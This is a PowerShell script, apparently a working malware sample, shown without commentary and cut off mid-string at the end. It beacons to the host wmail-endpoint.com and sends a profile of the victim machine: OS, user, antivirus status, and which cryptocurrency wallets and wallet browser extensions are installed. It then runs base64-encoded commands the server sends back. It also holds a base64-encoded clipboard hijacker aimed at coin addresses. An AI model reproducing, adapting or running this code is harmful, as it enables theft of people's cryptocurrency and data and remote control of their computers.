$meta_request = 'Z2V0IC92Mi8wZjNhNTRlYy00MTkxLTRmZWItOTc5MS04MmY5MTI3NzQ5OGU/dj12ZXIlNWYyIGh0dHAvMS4xDQpob3N0OiB3bWFpbC1lbmRwb2ludC5jb20NCmNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCnByYWdtYTogbm8tY2FjaGUNCmNhY2hlLWNvbnRyb2w6IG5vLWNhY2hlDQp1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzOiAxDQp1c2VyLWFnZW50OiBtb3ppbGxhLzUuMCAod2luZG93cyBudCAxMC4wOyB3aW42NDsgeDY0KSBhcHBsZXdlYmtpdC81MzcuMzYgKGtodG1sLCBsaWtlIGdlY2tvKSBjaHJvbWUvNzYuMC4zODA5LjcxIHNhZmFyaS81MzcuMzYNCmFjY2VwdC1sYW5ndWFnZTogZW4tdXMsZW47cT0wLjkNCmFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMw0KYWNjZXB0LWVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQoNCg==';
$meta_version = 4160822417;
$meta_guid = 19120;

############################
$createdNew = $false;
$mutex = [System.Threading.Mutex]::new($true, "6626b3d5-9306-45cb-91ca-3e86a88840e2", [ref]$createdNew);
if ($createdNew -eq $false) {
    Start-Sleep -Seconds 720;
    return;
}

$_headers = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($meta_request)) -split "`r`n";
$http_request = @{}; 
$http_headers = @{};

$_requestline = $_headers[0] -split ' ';
$http_request.path = $_requestline[1].Replace('%7b', '{').Replace('%7d', '}');

for ($i = 1; $i -lt $_headers.Length; $i++) {
    [string[]]$h = $_headers[$i] -split ': ';
    if ($h.Length -lt 2) {
        break;
    }
    $http_headers[$h[0]] = $h[1];
}

$user_auth = @{
    id = -1;
};

$client = New-Object 'System.Net.WebClient'

function WMI {
    param (
        $namespace,
        $class
    )
    try {
        return Get-WmiObject -Namespace $namespace -Class $class;
    }
    catch {
    }
    return $null;
}

function Get-AvStatus {
    param (
        $av
    )
    $status = "Unknown";
    try {
        $v = [uint32]::Parse($av.productState) -band 0xF000;
        switch ($v) {
            0x0000 { $status = "Disabled" }
            0x1000 { $status = "Enabled" }
            0x2000 { $status = "Snoozed" }
            0x3000 { $status = "Expired" }
        }
    }
    catch {

    }
    return "$($av.displayName) ($status)";
}

function Get-InstallStatus {
    param (
        $appname
    )
    $active = 0;
    $inactive = 0;
    $rgx = New-Object 'System.Text.RegularExpressions.Regex' '\s?--load-extension=(("[^\r\n"]*")|([^\r\n\s]*))';
    $shell = New-Object -comObject WScript.Shell
    for ($searchPath_index = 0; $searchPath_index -lt $searchPaths.Count; $searchPath_index++) {
        $searchPath = $searchPaths[$searchPath_index];
        if ((Test-Path $searchPath) -eq $false) {
            continue;
        }
        $lnks = Get-ChildItem -Path $searchPath -Filter "*.LNK"
        foreach ($lnk in $lnks) {
            $lnkobj = $shell.CreateShortcut($lnk.FullName);
            $target = $lnkobj.TargetPath;
            if ([string]::IsNullOrEmpty($target)) {
                continue;
            }
            if ((Test-Path $target) -eq $false) {
                continue;
            }
            $target = (Resolve-Path -Path $target).Path.ToLower();
            if ($target.EndsWith($appname, 'OrdinalIgnoreCase')) {
                $enabled = $false;
                $arguments = $lnkobj.Arguments;
                if ($null -ne $arguments) {
                    $m = $rgx.Match($arguments);
                    if ($m.Success -eq $true) {
                        $path = $m.Groups[1].Value;
                        $path = $path.Trim('"');
                        $enabled = ((Test-Path $path) -eq $true);
                    }
                }
                if ($enabled) {
                    $active++;
                }
                else {
                    $inactive++;
                }
            }
        }
    }

    if (($active -eq 0) -and ($inactive -eq 0)) {
        return $null;
    }
    elseif ($inactive -gt 0) {
        return 'NOK';
    }
    return 'OK';
}

$searchPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:PUBLIC\Desktop",
    "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar",
    "$env:USERPROFILE\OneDrive\Desktop"
);

$searchEntries = @(
    [pscustomobject]@{
        root    = '%appdata%'
        targets =
        [pscustomobject]@{
            name = 'Exodus-A'
            path = 'Exodus'
        },
        [pscustomobject]@{
            name = 'Atomic-A'
            path = 'Atomic Wallet'
        },
        [pscustomobject]@{
            name = 'Electrum-A'
            path = 'Electrum'
        },
        [pscustomobject]@{
            name = 'Ledger-A'
            path = 'Ledger Live'
        },
        [pscustomobject]@{
            name = 'Jaxx-A'
            path = 'Jaxx Liberty'
        },
        [pscustomobject]@{
            name = 'com.liberty.jaxx-A'
            path = 'com.liberty.jaxx'
        },
        [pscustomobject]@{
            name = 'Guarda-A'
            path = 'Guarda'
        },
        [pscustomobject]@{
            name = 'Armory-A'
            path = 'Armory'
        },
        [pscustomobject]@{
            name = 'DELTA-A'
            path = 'DELTA'
        },
        [pscustomobject]@{
            name = 'TREZOR-A'
            path = 'TREZOR Bridge'
        },
        [pscustomobject]@{
            name = 'Bitcoin-A'
            path = 'Bitcoin'
        },
        [pscustomobject]@{
            name = 'binance-A'
            path = 'binance'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%'
        targets =
        [pscustomobject]@{
            name = 'Blockstream-A'
            path = 'Blockstream Green'
        },
        [pscustomobject]@{
            name = 'Coinomi-A'
            path = 'Coinomi'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\Google\Chrome\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-C'
            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
        },
        [pscustomobject]@{
            name = 'MEWcx-C'
            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
        },
        [pscustomobject]@{
            name = 'Coin98-C'
            path = 'aeachknmefphepccionboohckonoeemg'
        },
        [pscustomobject]@{
            name = 'Binance-C'
            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
        },
        [pscustomobject]@{
            name = 'Jaxx-C'
            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
        },
        [pscustomobject]@{
            name = 'Coinbase-C'
            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\Microsoft\Edge\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-E'
            path = 'ejbalbakoplchlghecdalmeeeajnimhm'
        },
        [pscustomobject]@{
            name = 'Coinomi-E'
            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'
        }
    },
    [pscustomobject]@{
        root    = '%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Extensions'
        targets =
        [pscustomobject]@{
            name = 'Metamask-B'
            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
        },
        [pscustomobject]@{
            name = 'MEWcx-B'
            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
        },
        [pscustomobject]@{
            name = 'Coin98-B'
            path = 'aeachknmefphepccionboohckonoeemg'
        },
        [pscustomobject]@{
            name = 'Binance-B'
            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
        },
        [pscustomobject]@{
            name = 'Jaxx-B'
            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
        },
        [pscustomobject]@{
            name = 'Coinbase-B'
            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
        }
    }
);

function Get-Apps {
    $results = New-Object Collections.Generic.List[string];

    $appEntries = @('chrome.exe', 'brave.exe', 'msedge.exe');
    foreach ($appEntry in $appEntries) {
        $status = Get-InstallStatus $appEntry;
        if ($null -eq $status) {
            continue;
        }
        $results.Add("$([System.IO.Path]::GetFileNameWithoutExtension($appEntry))-$($status)");
    }

    foreach ($entry in $searchEntries) {
        $rootdir = [System.Environment]::ExpandEnvironmentVariables($entry.root);
        foreach ($target in $entry.targets) {
            if ((Test-Path -Path (Join-Path -Path $rootdir -ChildPath $target.path))) {
                $results.Add($target.name)
            }
        }
    }
    return [string]::Join(', ', $results);
}

function Get-UserInfo {
    $os = WMI "root\cimv2" "Win32_OperatingSystem";
    $avs = New-Object 'Collections.Generic.List[string]';
    WMI "root\SecurityCenter" "AntiVirusProduct" | ForEach-Object { $avs.Add((Get-AvStatus $_)) }
    WMI "root\SecurityCenter2" "AntiVirusProduct" | ForEach-Object { $avs.Add((Get-AvStatus $_)) }

    $info = @{
        os   = "$($os.Caption) ($($os.OSArchitecture))";
        cm   = "$($env:USERDOMAIN)\$($env:USERNAME)";
        av   = "$([string]::Join(', ', $avs))";
        apps = [string](Get-Apps);
        ip   = $http_headers['cf-connecting-ip'];
        geo  = $http_headers['cf-ipcountry'];
        ver  = (($http_request.path | Select-String -Pattern '\?v=(.*)&?').Matches.Groups[1].Value);
    }
    return ConvertTo-Json $info -Compress;
}

function Get-UserID {
    $ms = New-Object 'System.IO.MemoryStream'
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);
    $ms.WriteByte(1);
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_guid), 0, 4);
    $data = $ms.ToArray();
    $ms.Dispose();
    $client.Headers["Host"] = "$(-join ((97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 10) | % {[char]$_})).com";
    $res = $client.UploadData("http://wmail-endpoint.com", $data);
    if ($res.Length -ne 4) {
        throw "";
    }
    return [BitConverter]::ToInt32($res, 0);
}

function Build-Request {
    param (
        [bool]
        $update
    )

    if ($user_auth.id -eq -1) {
        $user_auth.id = Get-UserId;
    }

    $ms = New-Object 'System.IO.MemoryStream'
    $ms.Write([BitConverter]::GetBytes([uint32]$meta_version), 0, 4);
    $ms.WriteByte(2);
    $ms.Write([BitConverter]::GetBytes([int]$user_auth.id), 0, 4);
    if ($update) {
        $_userinfo = '';
        try {
            $_userinfo = Get-UserInfo;
        }
        catch {
            $_userinfo = ConvertTo-Json @{
                error  = $_.Exception.Message;
                line   = $_.Exception.Line;
                offset = $_.Exception.Offset;
            }
        }
        [byte[]]$userinfo = [Text.Encoding]::UTF8.GetBytes($_userinfo);
        $ms.Write($userinfo, 0, $userinfo.Length);
    }
    $data = $ms.ToArray();
    $ms.Dispose();
    return $data;
}

function Run-Command {
    param (
        [string]
        $command
    )
    $lines = $command -split "`r`n";
    foreach ($line in $lines) {
        $job = Start-Job -ScriptBlock ([Scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line))))
        Wait-Job -Job $job -Timeout 10
    }
}

#$wdg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5FbnZpcm9ubWVudF06OkN1cnJlbnREaXJlY3RvcnkgPSAkUFdELlBhdGg7DQpBZGQtVHlwZSAtUGF0aCAiJGVudjp3aW5kaXJcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcms2NFx2NC4wLjMwMzE5XFN5c3RlbS5SdW50aW1lLmRsbCI7DQpBZGQtVHlwZSAtUGF0aCAiJGVudjp3aW5kaXJcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcms2NFx2NC4wLjMwMzE5XFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5kbGwiOw0KDQokY3JlYXRlZE5ldyA9ICR0cnVlOw0KJG11dGV4TmFtZSA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCI0NTk1MSQoJGVudjpDT01QVVRFUk5BTUUpMTI4ODUkKCRlbnY6VVNFUk5BTUUpMjM0OSIpKSk7DQokbXV0ZXggPSBbU3lzdGVtLlRocmVhZGluZy5NdXRleF06Om5ldygkdHJ1ZSwgJG11dGV4TmFtZSwgW3JlZl0kY3JlYXRlZE5ldyk7DQppZiAoJGNyZWF0ZWROZXcgLWVxICRmYWxzZSkgew0KICAgIHJldHVybjsNCn0NCg0KJGFzc2VtYmxpZXMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5EaWN0aW9uYXJ5J1tzdHJpbmcsIFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XScgLUFyZ3VtZW50TGlzdCAoW1N0cmluZ0NvbXBhcmVyXTo6T3JkaW5hbElnbm9yZUNhc2UpDQpmb3JlYWNoICgkYXNzZW1ibHkgaW4gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSkpIHsNCiAgICAkYXNzZW1ibGllc1tbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkYXNzZW1ibHkuTG9jYXRpb24pXSA9ICRhc3NlbWJseTsNCn0NCg0KZnVuY3Rpb24gR2V0LVVuc2FmZUZ1bmN0aW9uIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddDQogICAgICAgICRtb2R1bGUsDQogICAgICAgIFtzdHJpbmddDQogICAgICAgICRuYW1lLA0KICAgICAgICBbdHlwZVtdXQ0KICAgICAgICAkcGFyYW1zLA0KICAgICAgICBbdHlwZV0NCiAgICAgICAgJHJldHR5cGUNCiAgICApDQogICAgJG5hID0gJGFzc2VtYmxpZXNbJ1N5c3RlbS5kbGwnXS5HZXRUeXBlKCgnTWljcm9zb2Z0JyArICcuV2luMzIuJyArICdVbnNhZmVOJyArICdhdGl2ZU1ldGhvZHMnKSk7DQogICAgJGdwID0gJG5hLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnLCBbVHlwZVtdXSBAKCdTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmJywgJ3N0cmluZycpKTsNCiAgICAkbWQgPSAkbmEuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKS5JbnZva2UoJG51bGwsIEAoJG1vZHVsZSkpOw0KICAgICRwdHIgPSAkZ3AuSW52b2tlKCRudWxsLCBAKChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl06Om5ldyhbb2JqZWN0XTo6bmV3KCksICRtZCkpLCAkbmFtZSkpOw0KICAgICRidSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseShbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lXTo6bmV3KCgnXycgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgoJ18nICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKSksICRmYWxzZSkuRGVmaW5lVHlwZSgoJ18nICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKSksICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pOw0KICAgICRidS5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRwYXJhbXMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKTsNCiAgICAkYnUuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkcmV0dHlwZSwgJHBhcmFtcykuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpOw0KICAgICRkZWwgPSAkYnUuQ3JlYXRlVHlwZSgpOw0KICAgIHJldHVybiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkcHRyLCAkZGVsKTsNCn0NCg0KDQokUmVnaXN0ZXJDbGFzc0V4ID0gR2V0LVVuc2FmZUZ1bmN0aW9uICd1c2VyMzIuZGxsJyAnUmVnaXN0ZXJDbGFzc0V4VycgQChbSW50UHRyXSkgKFtVSW50MTZdKTsNCiRDcmVhdGVXaW5kb3dFeCA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ0NyZWF0ZVdpbmRvd0V4VycgQChbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludDMyXSwgW0ludDMyXSwgW0ludDMyXSwgW0ludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSk7DQokR2V0TWVzc2FnZSA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ0dldE1lc3NhZ2VXJyBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludDMyXSk7DQokVHJhbnNsYXRlTWVzc2FnZSA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ1RyYW5zbGF0ZU1lc3NhZ2UnIEAoW0ludFB0cl0pIChbQm9vbGVhbl0pOw0KJERpc3BhdGNoTWVzc2FnZSA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ0Rpc3BhdGNoTWVzc2FnZVcnIEAoW0ludFB0cl0pIChbSW50UHRyXSk7DQokQWRkQ2xpcGJvYXJkRm9ybWF0TGlzdGVuZXIgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdBZGRDbGlwYm9hcmRGb3JtYXRMaXN0ZW5lcicgQChbSW50UHRyXSkgKFtCb29sZWFuXSk7DQokUmVtb3ZlQ2xpcGJvYXJkRm9ybWF0TGlzdGVuZXIgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdSZW1vdmVDbGlwYm9hcmRGb3JtYXRMaXN0ZW5lcicgQChbSW50UHRyXSkgKFtCb29sZWFuXSk7DQokRGVmV2luZG93UHJvY1cgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdEZWZXaW5kb3dQcm9jVycgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSk7DQokT3BlbkNsaXBib2FyZCA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ09wZW5DbGlwYm9hcmQnIEAoW0ludFB0cl0pIChbQm9vbGVhbl0pOw0KJEdldENsaXBib2FyZERhdGEgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdHZXRDbGlwYm9hcmREYXRhJyBAKFtVSW50MzJdKSAoW0ludFB0cl0pOw0KJFNldENsaXBib2FyZERhdGEgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdTZXRDbGlwYm9hcmREYXRhJyBAKFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKTsNCiRFbXB0eUNsaXBib2FyZCA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ0VtcHR5Q2xpcGJvYXJkJyBAKCkgKFtCb29sZWFuXSk7DQokR2xvYmFsTG9jayA9IEdldC1VbnNhZmVGdW5jdGlvbiAna2VybmVsMzIuZGxsJyAnR2xvYmFsTG9jaycgQChbSW50UHRyXSkgKFtJbnRQdHJdKTsNCiRHbG9iYWxVbmxvY2sgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ2tlcm5lbDMyLmRsbCcgJ0dsb2JhbFVubG9jaycgQChbSW50UHRyXSkgKFtCb29sZWFuXSk7DQokR2xvYmFsQWxsb2MgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ2tlcm5lbDMyLmRsbCcgJ0dsb2JhbEFsbG9jJyBAKFtVSW50MzJdLCBbVUludFB0cl0pIChbSW50UHRyXSk7DQokR2xvYmFsRnJlZSA9IEdldC1VbnNhZmVGdW5jdGlvbiAna2VybmVsMzIuZGxsJyAnR2xvYmFsRnJlZScgQChbSW50UHRyXSkgKFtJbnRQdHJdKTsNCiRDbG9zZUNsaXBib2FyZCA9IEdldC1VbnNhZmVGdW5jdGlvbiAndXNlcjMyLmRsbCcgJ0Nsb3NlQ2xpcGJvYXJkJyBAKCkgKFtCb29sZWFuXSk7DQokR2V0Q2xpcGJvYXJkT3duZXIgPSBHZXQtVW5zYWZlRnVuY3Rpb24gJ3VzZXIzMi5kbGwnICdHZXRDbGlwYm9hcmRPd25lcicgQCgpIChbSW50UHRyXSk7DQokR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkID0gR2V0LVVuc2FmZUZ1bmN0aW9uICd1c2VyMzIuZGxsJyAnR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkJyBAKFtJbnRQdHJdLCBbSW50UHRyXSkgKFtVSW50MzJdKTsNCg0KZnVuY3Rpb24gU2V0LUNsaXAgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10NCiAgICAgICAgJHRleHQNCiAgICApDQogICAgaWYgKCR0ZXh0IC1lcSAkbnVsbCkgew0KICAgICAgICAkdGV4dCA9ICIiOw0KICAgIH0NCiAgICAkdGV4dCArPSBbY2hhcl0wOw0KICAgIFtieXRlW11dJHRleHRiID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkdGV4dCk7DQogICAgJGhNZW0gPSAkR2xvYmFsQWxsb2MuSW52b2tlKDB4MDAwMiwgW1VJbnRQdHJdOjpuZXcoJHRleHRiLkxlbmd0aCkpOw0KICAgIGlmICgkaE1lbSAtbmUgMCkgew0KICAgICAgICAkdG1wID0gJEdsb2JhbExvY2suSW52b2tlKCRoTWVtKTsNCiAgICAgICAgaWYgKCR0bXAgLW5lIDApIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJHRleHRiLCAwLCAkdG1wLCAkdGV4dGIuTGVuZ3RoKSB8IE91dC1OdWxsOw0KICAgICAgICAgICAgJEdsb2JhbFVubG9jay5JbnZva2UoJGhNZW0pIHwgT3V0LU51bGw7DQogICAgICAgICAgICAkT3BlbkNsaXBib2FyZC5JbnZva2UoW1N5c3RlbS5JbnRQdHJdOjpaZXJvKSB8IE91dC1OdWxsOw0KICAgICAgICAgICAgJEVtcHR5Q2xpcGJvYXJkLkludm9rZSgpIHwgT3V0LU51bGw7IDsNCiAgICAgICAgICAgICRTZXRDbGlwYm9hcmREYXRhLkludm9rZSgxMywgJGhNZW0pIHwgT3V0LU51bGw7DQogICAgICAgICAgICAkQ2xvc2VDbGlwYm9hcmQuSW52b2tlKCkgfCBPdXQtTnVsbDsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICAkR2xvYmFsRnJlZS5JbnZva2UoJGhNZW0pIHwgT3V0LU51bGw7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtQ2xpcCB7DQogICAgW3N0cmluZ10kdGV4dCA9ICRudWxsOw0KICAgIGlmICgkT3BlbkNsaXBib2FyZC5JbnZva2UoW1N5c3RlbS5JbnRQdHJdOjpaZXJvKSAtbmUgMCkgew0KICAgICAgICAkaE1lbSA9ICRHZXRDbGlwYm9hcmREYXRhLkludm9rZSgxMyk7DQogICAgICAgIGlmICgkaE1lbSAtbmUgMCkgew0KICAgICAgICAgICAgJHRtcCA9ICRHbG9iYWxMb2NrLkludm9rZSgkaE1lbSk7DQogICAgICAgICAgICBpZiAoJHRtcCAtbmUgMCkgew0KICAgICAgICAgICAgICAgICR0ZXh0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdVbmkoJGhNZW0pOw0KICAgICAgICAgICAgICAgICRHbG9iYWxVbmxvY2suSW52b2tlKCRoTWVtKSB8IE91dC1OdWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRDbG9zZUNsaXBib2FyZC5JbnZva2UoKSB8IE91dC1OdWxsOw0KICAgIH0NCiAgICByZXR1cm4gJHRleHQ7DQp9DQoNCmZ1bmN0aW9uIEFsbG9jUHRyIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtieXRlW11dDQogICAgICAgICRkYXRhDQogICAgKQ0KICAgIFtJbnRQdHJdJHB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkZGF0YS5MZW5ndGgpOw0KICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGRhdGEsIDAsICRwdHIsICRkYXRhLkxlbmd0aCk7DQogICAgcmV0dXJuICRwdHI7DQp9DQoNCmZ1bmN0aW9uIEdldC1XbmRDbGFzcyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXQ0KICAgICAgICAkY2xhc3NuYW1lLA0KICAgICAgICBbSW50UHRyXQ0KICAgICAgICAkd25kcHJvYw0KICAgICkNCg0KICAgICRfY2xhc3NuYW1lID0gQWxsb2NQdHIgKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJGNsYXNzbmFtZSkpOw0KICAgICRtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQ0KICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgOCkgew0KICAgICAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDMyXTgwKSwgMCwgNCk7DQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDMyXTQ4KSwgMCwgNCk7DQogICAgfQ0KICAgICRtcy5Xcml0ZShbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKFt1aW50MzJdMCksIDAsIDQpOw0KICAgICRtcy5Xcml0ZShbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCR3bmRwcm9jLlRvSW50NjQoKSksIDAsIFtJbnRQdHJdOjpTaXplKTsNCiAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDMyXTApLCAwLCA0KTsNCiAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDMyXTApLCAwLCA0KTsNCiAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDY0XTApLCAwLCBbSW50UHRyXTo6U2l6ZSk7DQogICAgJG1zLldyaXRlKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW3VpbnQ2NF0wKSwgMCwgW0ludFB0cl06OlNpemUpOw0KICAgICRtcy5Xcml0ZShbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKFt1aW50NjRdMCksIDAsIFtJbnRQdHJdOjpTaXplKTsNCiAgICAkbXMuV3JpdGUoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbdWludDY0XTApLCAwLCBbSW50UHRyXTo6U2l6ZSk7DQogICAgJG1zLldyaXRlKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW3VpbnQ2NF0wKSwgMCwgW0ludFB0cl06OlNpemUpOw0KICAgICRtcy5Xcml0ZShbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRfY2xhc3NuYW1lLlRvSW50NjQoKSksIDAsIFtJbnRQdHJdOjpTaXplKTsgIyBscHN6Q2xhc3NOYW1lDQogICAgJG1zLldyaXRlKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW3VpbnQ2NF0wKSwgMCwgW0ludFB0cl06OlNpemUpOw0KICAgIHJldHVybiAoQWxsb2NQdHIgKCRtcy5Ub0FycmF5KCkpKTsNCn0NCg0KDQpbU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlcl0kY2xpcGhpc3RvcnkgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXI7DQokY29pbnMgPSBOZXctT2JqZWN0IENvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXhdOw0KJGNvaW5zLkFkZCgoTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5SZWd1bGFyRXh